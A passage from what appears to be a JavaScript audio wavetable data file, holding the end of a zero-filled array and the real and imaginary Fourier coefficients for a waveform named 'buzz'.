0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 ] } ],
	[ "buzz",        { real: [ 0, -.000001, -.139102, .086216, -.053293, .034018, -.024299, .01707, -.015971, .01553, -.012639, .011335, -.011541, .01043, -.009167, .008078, -.007356, .007138, -.006327, .005447, -.001334, .000749, -.000421, .000303, -.000297, .000234, -.00023, .000212, -.000208, .000246, -.000242, .000238, -.000234, .000389, -.000383, .000378, -.000373, .000582, -.000575, .000567, -.001135, .001121, -.001108, .002151, -.002127, .002103, -.004914, .004862, -.008108, .017829, -.01765, .018022, -.014397, .014261, -.014129, .011645, -.011541, .009515, -.006526, .00647, -.003472, .002311, -.001538, .001573, -.001561, .001549, -.001537, .001525, -.001299, .001289, -.00128, .001271, -.001262, .001417, -.001641, .001631, -.00162, .001609, -.001599, .001589, -.001579, .001569, -.00156, .00155, -.001541, .001532, -.001619, .00161, -.001601, .001592, -.001583, .001574, -.001566, .001557, -.001549, .001541, -.001533, .001525, -.001517, .00151, -.001502, .001495, -.001487, .00148, -.001473, .001466, -.001459, .001452, -.001446, .001439, -.001432, .001426, -.00142, .001413, -.001407, .001401, -.001395, .001389, -.001383, .001377, -.001372, .001366, -.00136, .001355, -.001349, .001344, -.001339, .001333, -.001328, .001323, -.001318, .001313, -.001308, .001303, -.001298, .001293, -.001288, .001284, -.001279, .001397, -.001392, .001387, -.001383, .001378, -.001373, .001368, -.001363, .001359, -.001354, .00135, -.001345, .001341, -.001336, .001332, -.001328, .001323, -.001319, .001315, -.001311, .001306, -.001302, .001298, -.001294, .00129, -.001286, .001282, -.001279, .001275, -.001271, .001267, -.001263, .00126, -.001256, .001252, -.001249, .001245, -.001242, .001238, -.001234, .001231, -.001228, .001224, -.001221, .001217, -.001214, .001211, -.001207, .001204, -.001201, .001198, -.001195, .001191, -.001188, .001185, -.001182, .001179, -.001176, .001173, -.00117, .001167, -.001164, .001161, -.001158, .001155, -.001152, .00115, -.001147, .001144, -.001141, .001138, -.001136, .001133, -.00113, .001128, -.000755, .000753, -.000751, .000773, -.000771, .000769, -.000767, .000766, -.000764, .000762, -.00076, .000759, -.000757, .000755, -.000753, .000752, -.000798, .000796, -.000794, .000792, -.000791, .000789, -.000787, .000786, -.000784, .000782, -.00078, .000779, -.000777, .000775, -.000774, .000772, -.000771, .000769, -.000767, .000766, -.000764, .000836, -.000835, .000833, -.000831, .000829, -.000854, .000852, -.00085, .000848, -.000847, .000845, -.000843, .000842, -.00084, .000838, -.000837, .000835, -.000833, .000832, -.00083, .000829, -.000827, .000825, -.000824, .000822, -.000821, .000819, -.000818, .000816, -.000815, .000813, -.000812, .00081, -.000809, .000783, -.000781, .00078, -.000778, .000777, -.000775, .000751, -.000749, .000748, -.000747, .000745, -.000744, .000743, -.000741, .00074, -.000739, .000737, -.000736, .000735, -.000733, .000732, -.000731, .000729, -.000728, .000727, -.000726, .000724, -.000723, .000722, -.000721, .000719, -.000718, .000717, -.000716, .000714, -.000713, .000712, -.000711, .00071, -.000708, .000707, -.000706, .000705, -.000704, .000702, -.000701, .0007, -.000699, .000698, -.000697, .000696, -.000694, .000693, -.000692, .000691, -.00069, .000689, -.000688, .000686, -.000685, .000684, -.000704, .000703, -.000702, .000701, -.0007, .000699, -.000698, .000696, -.000695, .000694, -.000693, .000692, -.000691, .00069, -.000689, .000688, -.000686, .000685, -.000684, .000683, -.000682, .000681, -.00068, .000679, -.000678, .000677, -.000676, .000675, -.000674, .000672, -.000671, .00067, -.000669, .000668, -.000667, .000666, -.000665, .000664, -.000663, .000662, -.000661, .00066, -.000659, .000658, -.000657, .000656, -.000655, .000654, -.000653, .000652, -.000651, .00065, -.000649, .000648, -.000647, .000646, -.000645, .000644, -.000643, .000642, -.000641, .00064, -.000639, .000638, -.000637, .000636, -.000635, .000634, -.000614, .000613, -.000612, .000611, -.00061, .000609, -.000608, .000607, -.000607, .000606, -.000605, .000604, -.000603, .000602, -.000601, .0006, -.000599, .000598, -.000597, .000596, -.000596, .000595, -.000594, .000593, -.000592, .000591, -.00059, .000589, -.000588, .000587, -.000587, .000586, -.000585, .000584, -.000583, .000582, -.000581, .00058, -.000579, .000579, -.000578, .000577, -.000576, .000575, -.000574, .000573, -.000572, .000571, -.000571, .00057, -.000569, .000568, -.000567, .000566, -.000565, .000564, -.000564, .000563, -.000562, .000561, -.00056, .000559, -.000558, .000558, -.000557, .000556, -.000555, .000554, -.000553, .000552, -.000473, .000472, -.000472, .000471, -.00047, .000469, -.000469, .000468, -.000467, .000466, -.000466, .000465, -.000464, .000463, -.000463, .000462, -.000461, .000461, -.00046, .000459, -.000458, .000458, -.000457, .000456, -.000455, .000455, -.000454, .000453, -.000452, .000452, -.000451, .00045, -.00045, .000449, -.000448, .000447, -.000447, .000446, -.000445, .000445, -.000444, .000443, -.000442, .000442, -.000441, .00044, -.000439, .000439, -.000438, .000437, -.000437, .000436, -.000435, .000434, -.000434, .000433, -.000432, .000431, -.000431, .00043, -.000429, .000429, -.000428, .000427, -.000426, .000426, -.000425, .000424, -.000423, .000423, -.000422, .000421, -.000421, .00042, -.000419, .000418, -.000418, .000417, -.000416, .000415, -.000415, .000414, -.000413, .000413, -.000412, .000411, -.00041, .00041, -.000409, .000408, -.000407, .000407, -.000406, .000405, -.000405, .000404, -.000403, .000402, -.000402, .000401, -.0004, .000399, -.000399, .000398, -.000397, .000396, -.000396, .000349, -.000349, .000348, -.000347, .000347, -.000346, .000345, -.000345, .000344, -.000343, .000343, -.000342, .000341, -.000341, .00034, -.00034, .000339, -.000338, .000338, -.000337, .000336, -.000336, .000335, -.000334, .000334, -.000333, .000332, -.000332, .000331, -.00033, .00033, -.000329, .000328, -.000328, .000327, -.000326, .000326, -.000325, .000324, -.000324, .000323, -.000322, .000322, -.000321, .00032, -.00032, .000319, -.000318, .000318, -.000317, .000316, -.000316, .000315, -.000314, .000314, -.000313, .000312, -.000311, .000311, -.00031, .000309, -.000309, .000308, -.000307, .000307, -.000306, .000305, -.000305, .000304, -.000303, .000303, -.000302, .000301, -.000301, .0003, -.000299, .000298, -.000298, .000297, -.000296, .000296, -.000295, .000294, -.000294, .000293, -.000292, .000291, -.000291, .00029, -.000289, .000271, -.000271, .00027, -.00027, .000269, -.000268, .000268, -.000267, .000266, -.000266, .000265, -.000264, .000264, -.000263, .000262, -.000262, .000261, -.00026, .000259, -.000259, .000258, -.000257, .000257, -.000256, .000255, -.000255, .000254, -.000253, .000253, -.000252, .000251, -.000251, .00025, -.000249, .000249, -.000248, .000247, -.000247, .000246, -.000245, .000245, -.000244, .000243, -.000242, .000242, -.000241, .00024, -.00024, .000239, -.000238, .000238, -.000237, .000236, -.000235, .000235, -.000234, .000233, -.000233, .000232, -.000231, .000231, -.00023, .000229, -.000228, .000228, -.000227, .000226, -.000226, .000225, -.000224, .000223, -.000223, .000222, -.000221, .000221, -.00022, .000219, -.000218, .000218, -.000217, .000216, -.000216, .000215, -.000214, .000213, -.000213, .000212, -.000211, .00021, -.00021, .000209, -.000208, .000208, -.000207, .000206, -.000205, .000205, -.000204, .000203, -.000202, .000178, -.000178, .000177, -.000176, .000176, -.000175, .000174, -.000174, .000173, -.000172, .000172, -.000171, .00017, -.00017, .000169, -.000168, .000168, -.000167, .000166, -.000166, .000165, -.000164, .000164, -.000163, .000162, -.000162, .000161, -.00016, .00016, -.000159, .000158, -.000158, .000157, -.000156, .000156, -.000155, .000154, -.000154, .000153, -.000152, .000152, -.000151, .00015, -.000149, .000149, -.000148, .000147, -.000147, .000146, -.000145, .000145, -.000144, .000143, -.000143, .000142, -.000141, .000141, -.00014, .000139, -.000138, .000138, -.000137, .000136, -.000136, .000135, -.000134, .000134, -.000133, .000132, -.000131, .000131, -.00013, .000129, -.000129, .000128, -.000127, .000126, -.000126, .000125, -.000124, .000124, -.000123, .000122, -.000121, .000121, -.00012, .000119, -.000118, .000118, -.000117, .000116, -.000116, .000115, -.000114, .000113, -.000113, .000112, -.000111, .000111, -.00011, .000109, -.000108, .000108, -.000107, .000106, -.000105, .000105, -.000104, .000103, -.000103, .000102, -.000101, .0001, -.0001, .000099, -.000098, .000097, -.000097, .000096, -.000095, .000094, -.000094, .000093, -.000092, .000091, -.000091, .00009, -.000089, .000088, -.000088, .000087, -.000086, .000085, -.000085, .000084, -.000083, .000083, -.000082, .000081, -.00008, .000079, -.000079, .000078, -.000077, .000076, -.000076, .000075, -.000074, .000073, -.000073, .000072, -.000071, .00007, -.00007, .000069, -.000068, .000067, -.000067, .000066, -.000065, .000064, -.000064, .000063, -.000062, .000061, -.00006, .00006, -.000059, .000058, -.000057, .000057, -.000056, .000055, -.000054, .000052, -.000051, .000051, -.00005, .000049, -.000048, .000048, -.000047, .000046, -.000045, .000045, -.000044, .000043, -.000042, .000042, -.000041, .00004, -.000039, .000039, -.000038, .000037, -.000036, .000036, -.000035, .000034, -.000033, .000033, -.000032, .000031, -.00003, .000029, -.000029, .000028, -.000027, .000026, -.000026, .000025, -.000024, .000023, -.000023, .000022, -.000021, .00002, -.00002, .000019, -.000018, .000017, -.000017, .000016, -.000015, .000014, -.000014, .000013, -.000012, .000011, -.000011, .00001, -.000009, .000008, -.000008, .000007, -.000006, .000005, -.000005, .000004, -.000003, .000002, -.000002, .000001, 0, -.000001, .000002, -.000002, .000003, -.000004, .000005, -.000005, .000006, -.000007, .000008, -.000008, .000009, -.00001, .000011, -.000011, .000012, -.000013, .000014, -.000014, .000015, -.000016, .000017, -.000017, .000018, -.000019, .00002, -.00002, .000021, -.000022, .000023, -.000024, .000024, -.000025, .000026, -.000027, .000027, -.000028, .000029, -.00003, .00003, -.000031, .000032, -.000033, .000033, -.000034, .000035, -.000036, .000036, -.000037, .000038, -.000039, .000039, -.00004, .000041, -.000041, .000042, -.000043, .000044, -.000044, .000045, -.000046, .000047, -.000047, .000048, -.000049, .00005, -.00005, .000051, -.000052, .000053, -.000053, .000054, -.000055, .000056, -.000056, .000057, -.000058, .000059, -.000059, .00006, -.000061, .000062, -.000062, .000063, -.000064, .000065, -.000065, .000066, -.000067, .000067, -.000068, .000069, -.00007, .00007, -.000071, .000072, -.000073, .000073, -.000074, .000075, -.000075, .000076, -.000077, .000078, -.000078, .000079, -.00008, .00008, -.000081, .000082, -.000083, .000083, -.000084, .000085, -.000085, .000086, -.000087, .000087, -.000088, .000089, -.00009, .00009, -.000091, .000092, -.000092, .000093, -.000094, .000095, -.000095, .000096, -.000097, .000097, -.000098, .000099, -.000099, .0001, -.000101, .000101, -.000102, .000103, -.000104, .000104, -.000105, .000106, -.000106, .000107, -.000108, .000108, -.000109, .000109, -.00011, .000111, -.000112, .000112, -.000113, .000114, -.000114, .000115, -.000116, .000116, -.000117, .000118, -.000118, .000119, -.000119, .00012, -.000121, .000121, -.000122, .000123, -.000123, .000124, -.000125, .000125, -.000126, .000126, -.000127, .000128, -.000128, .000129, -.00013, .00013, -.000131, .000131, -.000132, .000133, -.000133, .000134, -.000135, .000135, -.000136, .000136, -.000137, .000138, -.000138, .000139, -.000139, .00014, -.00014, .000141, -.000142, .000142, -.000143, .000144, -.000144, .000145, -.000145, .000146, -.000146, .000147, -.000148, .000148, -.000149, .000149, -.00015, .00015, -.000151, .000152, -.000152, .000153, -.000153, .000154, -.000154, .000155, -.000155, .000156, -.000156, .000157, -.000157, .000158, -.000159, .000159, -.00016, .00016, -.000161, .000161, -.000162, .000162, -.000163, .000163, -.000164, .000164, -.000165, .000165, -.000166, .000166, -.000167, .000178, -.000178, .000179, -.000179, .00018, -.00018, .000181, -.000181, .000182, -.000182, .000183, -.000183, .000184, -.000184, .000185, -.000185, .000186, -.000186, .000187, -.000187, .000188, -.000188, .000189, -.000189, .00019, -.00019, .000191, -.000191, .000191, -.000192, .000192, -.000193, .000193, -.000194, .000194, -.000194, .000195, -.000195, .000196, -.000196, .000197, -.000197, .000197, -.000198, .000198, -.000199, .000199, -.000199, .0002, -.0002, .000201, -.000201, .000201, -.000202, .000202, -.000202, .000203, -.000203, .000204, -.000204, .000204, -.000205, .000205, -.000205, .000206, -.000206, .000206, -.000207, .000207, -.000207, .000208, -.000208, .000208, -.000209, .000209, -.000209, .000209, -.00021, .00021, -.00021, .000211, -.000211, .000211, -.000211, .000212, -.000212, .000212, -.000213, .000213, -.000213, .000213, -.000214, .000214, -.000214, .000214, -.000215, .000215, -.000215, .000215, -.000215, .000216, -.000216, .000216, -.000216, .000217, -.000217, .000217, -.000217, .000217, -.000217, .000218, -.000218, .000218, -.000218, .000218, -.000219, .000219, -.000219, .000219, -.000219, .000219, -.000219, .00022, -.00022, .00022, -.00022, .00022, -.00022, .00022, -.00022, .000221, -.000221, .000221, -.000221, .000221, -.000221, .000221, -.000221, .000221, -.000221, .000221, -.000221, .000222, -.000222, .000222, -.000222, .000222, -.000222, .000222, -.000222, .000222, -.000222, .000222, -.000222, .000222, -.000222, .000222, -.000222, .000222, -.000222, .000222, -.000222, .000222, -.000222, .000222, -.000222, .000222, -.000222, .000222, -.000222, .000222, -.000222, .000222, -.000222, .000221, -.000221, .000221, -.000221, .000221, -.000221, .000221, -.000221, .000221, -.000221, .000221, -.00022, .00022, -.00022, .00022, -.00022, .00022, -.00022, .00022, -.000219, .000219, -.000219, .000219, -.000219, .000219, -.000218, .000218, -.000218, .000218, -.000218, .000218, -.000217, .000217, -.000217, .000217, -.000217, .000216, -.000216, .000216, -.000216, .000215, -.000215, .000215, -.000215, .000215, -.000214, .000214, -.000214, .000213, -.000213, .000213, -.000213, .000212, -.000212, .000212, -.000211, .000211, -.000211, .000211, -.00021, .00021, -.00021, .000209, -.000209, .000209, -.000208, .000208, -.000208, .000207, -.000207, .000207, -.000206, .000206, -.000205, .000205, -.000205, .000204, -.000204, .000204, -.000203, .000203, -.000202, .000202, -.000202, .000201, -.000201, .0002, -.0002, .000199, -.000199, .000199, -.000198, .000198, -.000197, .000197, -.000196, .000196, -.000195, .000195, -.000194, .000194, -.000193, .000193, -.000192, .000192, -.000191, .000191, -.00019, .00019, -.000189, .000189, -.000188, .000188, -.000187, .000187, -.000186, .000186, -.000185, .000185, -.000184, .000183, -.000183, .000182, -.000182, .000181, -.000181, .00018, -.000179, .000179, -.000178, .000178, -.000177, .000176, -.000176, .000175, -.000175, .000174, -.000173, .000173, -.000172, .000171, -.000171, .00017, -.000169, .000169, -.000168, .000167, -.000167, .000166, -.000165, .000165, -.000164, .000163, -.000163, .000162, -.000161, .000161, -.00016, .000159, -.000158, .000158, -.000157, .000156, -.000156, .000155, -.000154, .000153, -.000153, .000152, -.000151, .00015, -.00015, .000149, -.000148, .000147, -.000147, .000146, -.000145, .000144, -.000143, .000143, -.000142, .000141, -.00014, .000139, -.000139, .000138, -.000137, .000136, -.000135, .000135, -.000134, .000133, -.000132, .000131, -.00013, .00013, -.000129, .000128, -.000127, .000126, -.000125, .000125, -.000124, .000123, -.000122, .000121, -.00012, .000119, -.000118, .000118, -.000117, .000116, -.000115, .000114, -.000113, .000112, -.000111, .00011, -.00011, .000109, -.000108, .000107, -.000106, .000105, -.000104, .000103, -.000102, .000101, -.0001, .000099, -.000099, .000098, -.000097, .000096, -.000095, .000094, -.000093, .000092, -.000091, .00009, -.000089, .000088, -.000087, .000086, -.000085, .000084, -.000083, .000082, -.000081, .00008, -.000079, .000078, -.000077, .000076, -.000075, .000074, -.000073, .000072, -.000071, .00007, -.000069, .000068, -.000067, .000066, -.000065, .000064, -.000063, .000062, -.000061, .00006, -.000059, .000058, -.000057, .000056, -.000055, .000054, -.000053, .000052, -.000051, .00005, -.000049, .000048, -.000047, .000046, -.000045, .000044, -.000043, .000042, -.000041, .00004, -.000039, .000038, -.000037, .000036, -.000035, .000033, -.000032, .000031, -.00003, .000029, -.000028, .000027, -.000026, .000025, -.000024, .000023, -.000022, .000021, -.00002, .000019, -.000018, .000017, -.000016, .000014, -.000013, .000012, -.000011, .00001, -.000009, .000008, -.000007, .000006, -.000005, .000004, -.000003, .000002, -.000001, 0, .000001, -.000003, .000004, -.000005, .000006, -.000007, .000008, -.000009, .00001, -.000011, .000012, -.000013, .000014, -.000015, .000016, -.000017, .000018, -.00002, .000021, -.000022, .000023, -.000024, .000025, -.000026, .000027, -.000028, .000029, -.00003, .000031, -.000032, .000033, -.000034, .000035, -.000036, .000037, -.000038, .000039, -.000041, .000041, -.000043, .000044, -.000045, .000046, -.000047, .000048, -.000049, .00005, -.000051, .000052, -.000053, .000054, -.000055, .000056, -.000057, .000058, -.000059, .00006, -.000061, .000062, -.000063, .000064, -.000065, .000066, -.000067, .000068, -.000069, .00007, -.000071, .000072, -.000073, .000074, -.000075, .000076, -.000077, .000078, -.000079, .00008, -.000081, .000082, -.000083, .000084, -.000085, .000086, -.000087, .000088, -.000089, .00009, -.00009, .000091, -.000092, .000093, -.000094, .000095, -.000096, .000097, -.000098, .000099, -.0001, .000101, -.000101, .000102, -.000103, .000104, -.000105, .000106, -.000107, .000108, -.000109, .000109, -.00011, .000111, -.000112, .000113, -.000114, .000115, -.000116, .000116, -.000117, .000118, -.000119, .00012, -.000121, .000121, -.000122, .000123, -.000124, .000125, -.000125, .000126, -.000127, .000128, -.000129, .000129, -.00013, .000131, -.000132, .000133, -.000133, .000134, -.000135, .000136, -.000149, .00015, -.000151, .000152, -.000153, .000153, -.000154, .000155, -.000156, .000157, -.000157, .000158, -.000159, .00016, -.00016, .000161, -.000162, .000163, -.000163, .000164, -.000165, .000165, -.000166, .000167, -.000168, .000168, -.000169, .00017, -.00017, .000171, -.000172, .000172, -.000173, .000174, -.000174, .000175, -.000175, .000176, -.000177, .000177, -.000178, .000178, -.000179, .00018, -.00018, .000181, -.000181, .000182, -.000182, .000183, -.000184, .000184, -.000185, .000185, -.000186, .000186, -.000187, .000187, -.000188, .000188, -.000189, .000189, -.00019, .00019, -.00019, .000191, -.000191, .000192, -.000192, .000193, -.000193, .000193, -.000194, .000194, -.000195, .000195, -.000195, .000196, -.000196, .000196, -.000197, .000197, -.000197, .000198, -.000198, .000198, -.000199, .000199, -.000199, .000199, -.0002, .0002, -.0002, .0002, -.000201, .000201, -.000201, .000201, -.000201, .000202, -.000202, .000202, -.000202, .000202, -.000203, .000203, -.000203, .000203, -.000203, .000203, -.000203, .000204, -.000204, .000204, -.000204, .000204, -.000204, .000204, -.000204, .000204, -.000204, .000204, -.000204, .000204, -.000204, .000204, -.000204, .000204, -.000204, .000204, -.000204, .000204 ],  imag: [ 0, .341455, -.000001, .000002, -.000001, .000001, -.000001, .000001, -.000002, .000002, -.000002, .000002, -.000002, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000001, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000003, .000003, -.000003, .000006, -.000006, .000006, -.000016, .000016, -.000028, .000064, -.000066, .00007, -.000058, .00006, -.000062, .000053, -.000054, .000046, -.000033, .000034, -.000019, .000013, -.000009, .000009, -.00001, .00001, -.00001, .00001, -.000009, .000009, -.000009, .00001, -.00001, .000011, -.000013, .000014, -.000014, .000014, -.000015, .000015, -.000015, .000015, -.000016, .000016, -.000016, .000017, -.000018, .000018, -.000019, .000019, -.000019, .00002, -.00002, .00002, -.000021, .000021, -.000021, .000021, -.000022, .000022, -.000023, .000023, -.000023, .000024, -.000024, .000024, -.000025, .000025, -.000025, .000026, -.000026, .000026, -.000027, .000027, -.000027, .000028, -.000028, .000028, -.000029, .000029, -.00003, .00003, -.00003, .000031, -.000031, .000031, -.000032, .000032, -.000033, .000033, -.000033, .000034, -.000034, .000035, -.000035, .000035, -.000036, .000036, -.000036, .00004, -.000041, .000041, -.000042, .000042, -.000043, .000043, -.000044, .000044, -.000044, .000045, -.000045, .000046, -.000046, .000047, -.000047, .000048, -.000048, .000049, -.000049, .000049, -.00005, .00005, -.000051, .000051, -.000052, .000052, -.000053, .000053, -.000054, .000054, -.000055, .000055, -.000056, .000056, -.000057, .000057, -.000058, .000058, -.000059, .000059, -.00006, .00006, -.000061, .000061, -.000062, .000062, -.000063, .000063, -.000064, .000064, -.000065, .000065, -.000066, .000066, -.000067, .000067, -.000068, .000068, -.000069, .000069, -.00007, .00007, -.000071, .000071, -.000072, .000072, -.000073, .000074, -.000074, .000075, -.000075, .000076, -.000076, .000077, -.000052, .000052, -.000053, .000055, -.000055, .000055, -.000056, .000056, -.000057, .000057, -.000057, .000058, -.000058, .000058, -.000059, .000059, -.000063, .000064, -.000064, .000065, -.000065, .000065, -.000066, .000066, -.000067, .000067, -.000067, .000068, -.000068, .000069, -.000069, .00007, -.00007, .00007, -.000071, .000071, -.000072, .000079, -.00008, .00008, -.000081, .000081, -.000084, .000085, -.000085, .000086, -.000086, .000087, -.000087, .000088, -.000088, .000088, -.000089, .00009, -.00009, .000091, -.000091, .000092, -.000092, .000092, -.000093, .000094, -.000094, .000095, -.000095, .000096, -.000096, .000097, -.000097, .000098, -.000098, .000096, -.000096, .000097, -.000097, .000098, -.000098, .000096, -.000096, .000097, -.000097, .000098, -.000098, .000099, -.000099, .0001, -.0001, .000101, -.000101, .000102, -.000102, .000103, -.000103, .000104, -.000104, .000105, -.000105, .000106, -.000106, .000107, -.000107, .000108, -.000108, .000109, -.000109, .00011, -.00011, .000111, -.000111, .000112, -.000112, .000113, -.000113, .000114, -.000114, .000115, -.000115, .000116, -.000116, .000117, -.000118, .000118, -.000119, .000119, -.00012, .00012, -.000121, .000121, -.000122, .000122, -.000123, .000123, -.000128, .000128, -.000129, .000129, -.00013, .00013, -.000131, .000131, -.000132, .000133, -.000133, .000134, -.000134, .000135, -.000135, .000136, -.000136, .000137, -.000138, .000138, -.000139, .000139, -.00014, .00014, -.000141, .000142, -.000142, .000143, -.000143, .000144, -.000144, .000145, -.000145, .000146, -.000147, .000147, -.000148, .000148, -.000149, .000149, -.00015, .000151, -.000151, .000152, -.000152, .000153, -.000153, .000154, -.000155, .000155, -.000156, .000156, -.000157, .000158, -.000158, .000159, -.000159, .00016, -.00016, .000161, -.000162, .000162, -.000163, .000163, -.000164, .000164, -.000165, .000166, -.000161, .000162, -.000162, .000163, -.000163, .000164, -.000165, .000165, -.000166, .000166, -.000167, .000168, -.000168, .000169, -.000169, .00017, -.00017, .000171, -.000171, .000172, -.000173, .000173, -.000174, .000174, -.000175, .000176, -.000176, .000177, -.000177, .000178, -.000179, .000179, -.00018, .00018, -.000181, .000181, -.000182, .000182, -.000183, .000184, -.000184, .000185, -.000185, .000186, -.000187, .000187, -.000188, .000188, -.000189, .00019, -.00019, .000191, -.000191, .000192, -.000192, .000193, -.000194, .000194, -.000195, .000195, -.000196, .000197, -.000197, .000198, -.000198, .000199, -.0002, .0002, -.000201, .000201, -.000173, .000174, -.000174, .000175, -.000175, .000176, -.000176, .000177, -.000177, .000178, -.000178, .000179, -.000179, .00018, -.00018, .000181, -.000181, .000182, -.000182, .000183, -.000183, .000184, -.000184, .000185, -.000185, .000186, -.000186, .000187, -.000187, .000188, -.000188, .000189, -.00019, .00019, -.000191, .000191, -.000192, .000192, -.000193, .000193, -.000194, .000194, -.000195, .000195, -.000196, .000196, -.000197, .000197, -.000198, .000198, -.000199, .000199, -.0002, .0002, -.000201, .000201, -.000202, .000202, -.000203, .000203, -.000204, .000204, -.000205, .000205, -.000206, .000206, -.000207, .000207, -.000208, .000208, -.000209, .000209, -.00021, .00021, -.000211, .000211, -.000212, .000213, -.000213, .000213, -.000214, .000215, -.000215, .000216, -.000216, .000217, -.000217, .000218, -.000218, .000219, -.000219, .00022, -.00022, .000221, -.000221, .000222, -.000222, .000223, -.000223, .000224, -.000224, .000225, -.000225, .000226, -.000226, .000227, -.000227, 